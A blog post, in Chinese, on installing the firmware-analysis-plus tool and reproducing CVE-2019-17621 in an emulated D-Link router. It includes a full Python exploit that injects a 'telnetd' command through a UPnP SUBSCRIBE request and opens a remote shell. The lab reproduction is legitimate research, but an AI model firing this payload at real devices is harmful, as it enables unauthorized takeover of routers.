---
layout: post
tags: [iot]
title: "Firmware analysis plus"
date: 2023-5-20
author: wsxk
comments: true
---

- [前言](#前言)
- [install](#install)
- [CVE-2019-17621漏洞复现](#cve-2019-17621漏洞复现)
  - [1.uPnP协议](#1upnp协议)
  - [2. exp](#2-exp)


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>

## 前言<br>
`firmware-analysis-plus` 来自三个上游工具`binwalk、firmadyne、firmware-analysis-toolkit`，实不相瞒，这叁工具我都用过，有一定的功效性，但是不能其实功能不是很稳定，存在缺陷。<br>
偶然发现了高级东西`firmware-analysis-plus`在前三个工具的基础上更新了新内容，我还是很想体验一下用法的。<br>

## install<br>
在`ubuntu20`上进行安装，十分友好<br>
[https://github.com/wsxk/firmware-analysis-plus](https://github.com/wsxk/firmware-analysis-plus)<br>
安装很友好！<br>

## CVE-2019-17621漏洞复现<br>
[CVE网址](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17621)<br>

### 1.uPnP协议<br>
uPnP，全称Universal Plug and Play，中文可以翻译为“通用即插即用”。这是一种网络协议，允许网络设备之间无缝的发现和交互。这种协议被广泛应用于家庭和小型企业网络中。<br>
UPnP的目标是实现设备的动态连接，设备可以自动化地加入网络、获取IP地址、公布其服务供其他设备或控制点使用，以及接收并处理来自其他设备或控制点的服务请求。它的设计理念是“即插即用”，即设备能够在插入网络时立即可用，不需要进行复杂的设备设置或网络配置。<br>
UPnP支持各种各样的设备，包括但不限于计算机、打印机、摄像头、路由器、移动设备、智能电视等。通过使用UPnP，这些设备可以自动发现网络上的其他设备并与之交互。例如，一部UPnP兼容的智能电视可以自动发现网络上的媒体服务器，并从媒体服务器上播放视频或音频。<br>
然而，虽然UPnP提供了很大的便利性，但它也有一些安全问题。因为UPnP假设网络中的所有设备都是可信的，所以它没有内置的安全机制。这意味着恶意设备可以利用UPnP来执行不安全的操作，例如打开路由器的端口，使得外部攻击者可以访问网络内部的设备。因此，在使用UPnP时，我们需要对网络安全保持警惕。<br>

### 2. exp<br>
使用`python3 fap.py -q qemu-builds/2.5.0/  testcases/DIR822A1_FW103WWb03.bin` 复现环境<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2023-4-27-vscode_cmake/20230609230012.png)
使用如下脚本进行复现<br>
```python
import socket
import os
from time import sleep
# Exploit By Miguel Mendez & Pablo Pollanco
def httpSUB(server, port, shell_file):
    print('\n[*] Connection {host}:{port}'.format(host=server, port=port))
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
    request += "Host: " + str(server) + str(port) + "\n"
    request += "Callback: <http://192.168.0.4:34033/ServiceProxy27>\n"
    request += "NT: upnp:event\n"
    request += "Timeout: Second-1800\n"
    request += "Accept-Encoding: gzip, deflate\n"
    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
    sleep(1)
    print('[*] Sending Payload')
    con.connect((socket.gethostbyname(server),port))
    con.send((request).encode())
    results = con.recv(4096)
    sleep(1)
    print('[*] Running Telnetd Service')
    sleep(1)
    print('[*] Opening Telnet Connection\n')
    sleep(2)
    os.system('telnet ' + str(server) + ' 9999')
serverInput = '192.168.0.1'
portInput = 49152
httpSUB(serverInput, portInput, '`telnetd -p 9999 &`')
```

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2023-4-27-vscode_cmake/20230609230209.png)
可以发现成功进入后台。<br>